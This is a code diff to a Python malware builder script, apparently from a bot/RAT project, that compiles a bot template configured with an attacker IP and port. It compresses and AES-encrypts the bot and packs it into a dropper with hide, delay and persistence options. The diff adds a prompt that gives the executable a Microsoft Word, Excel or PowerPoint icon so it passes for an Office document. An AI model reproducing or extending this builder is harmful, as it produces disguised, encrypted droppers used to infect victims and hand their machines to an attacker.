@@ -2,12 +2,12 @@
 # Author: Pure-L0G1C
 # Description: Execute creator
 
-import os  
-import sys 
-import zlib 
-import shlex 
+import os
+import sys
+import zlib
+import shlex
 import shutil
-import smtplib 
+import smtplib
 import tempfile
 from lib.file import File
 from lib.args import Args
@@ -19,6 +19,7 @@ except:
     print('Please install Pyinstaller: pip install pyinstaller')
     sys.exit(1)
 
+
 class Executor(object):
 
     def __init__(self, ip, port, filename, delay, wait, exe, icon, hide, persist):
@@ -27,11 +28,11 @@ class Executor(object):
         self.port = port
         self.hide = hide
         self.wait = wait
-        self.icon = icon
         self.binary = b''
         self.delay = delay
         self.persist = persist
         self.filename = filename
+        self.icon = shlex.quote(icon)
         self.key = CryptoAES.generate_key()
 
         self.output_dir = 'output'
@@ -43,7 +44,8 @@ class Executor(object):
 
         self.bot_template = 'bot' + os.path.sep + 'template_bot.py'
         self.bot_py_temp = 'bot' + os.path.sep + '{}.py'.format(filename)
-        self.bot_compiled = self.dist_path + os.path.sep + '{}.exe'.format(filename)
+        self.bot_compiled = self.dist_path + \
+            os.path.sep + '{}.exe'.format(filename)
 
         self.dropper_template = 'lib' + os.path.sep + 'dropper.py'
         self.dropper_py_temp = '{}.py'.format(filename)
@@ -57,9 +59,12 @@ class Executor(object):
         path = os.path.abspath(path)
 
         build_path = os.path.join(self.tmp_dir, 'build')
-        cmd = 'pyinstaller -y -F -w {}'.format(shlex.quote(path))
+        cmd = 'pyinstaller -y -F -w -i {} {}'.format(
+            self.icon, shlex.quote(path))
 
-        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + ['--workpath', build_path] + ['--specpath', self.tmp_dir]
+        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + \
+            ['--workpath', build_path] + ['--specpath', self.tmp_dir]
+
         pyi.run()
 
     def write_template(self, template, py_temp, _dict):
@@ -82,15 +87,16 @@ class Executor(object):
         self.write_template(self.bot_template, self.bot_py_temp, _dict)
         if self.exe:
             with open(self.bot_compiled, 'rb') as f:
-                self.binary = CryptoAES.encrypt(zlib.compress(f.read()), self.key)
+                self.binary = CryptoAES.encrypt(
+                    zlib.compress(f.read()), self.key)
 
     def compile_dropper(self):
         _dict = {
-         'data_name': repr('_{}.exe'.format(self.filename)),
-         'data_binary': repr(self.binary),
-         'data_key': repr(self.key),
-         'data_hide': str(self.hide),
-         'data_delay': str(self.delay)
+            'data_name': repr('_{}.exe'.format(self.filename)),
+            'data_binary': repr(self.binary),
+            'data_key': repr(self.key),
+            'data_hide': str(self.hide),
+            'data_delay': str(self.delay)
         }
 
         self.write_template(self.dropper_template, self.dropper_py_temp, _dict)
@@ -112,19 +118,41 @@ class Executor(object):
             self.compile_dropper()
             file = os.listdir(self.dist_path)[0]
             self.move_file(file)
-            self.clean_up() 
+            self.clean_up()
 
     def clean_up(self):
         shutil.rmtree(self.tmp_dir)
         os.remove(self.bot_py_temp)
         os.remove(self.dropper_py_temp)
 
+
 if __name__ == '__main__':
     args = Args()
     if args.set_args():
-        executor = Executor(args.ip, args.port, args.name, args.delay, args.wait, args.type, args.icon, args.hide, args.persist)
+        if not args.icon and args.type:
+            icons = {
+                1: 'icons/wordicon.ico',
+                2: 'icons/excelicon.ico',
+                3: 'icons/ppticon.ico'
+            }
+
+            option = input(
+                '\n\n1) MS Word\n2) MS Excel\n3) MS Powerpoint\n\nSelect an icon option: ')
+
+            if not option.isdigit():
+                args.icon = icons[1]
+            elif int(option) > 3 or int(option) < 1:
+                args.icon = icons[1]
+            else:
+                args.icon = icons[int(option)]
+
+            args.icon = os.path.abspath(args.icon)
+
+        executor = Executor(args.ip, args.port, args.name, args.delay,
+                            args.wait, args.type, args.icon, args.hide, args.persist)
 
         executor.start()
         os.system('cls' if is_win else 'clear')
-        print('\nFinished creating {}'.format(executor.filename + '.exe' if executor.exe else executor.bot_py_temp))
+        print('\nFinished creating {}'.format(executor.filename +
+                                              '.exe' if executor.exe else executor.bot_py_temp))
         print('Look in the directory named output for your exe file' if executor.exe else 'Look in the directory named bot for your Python file')
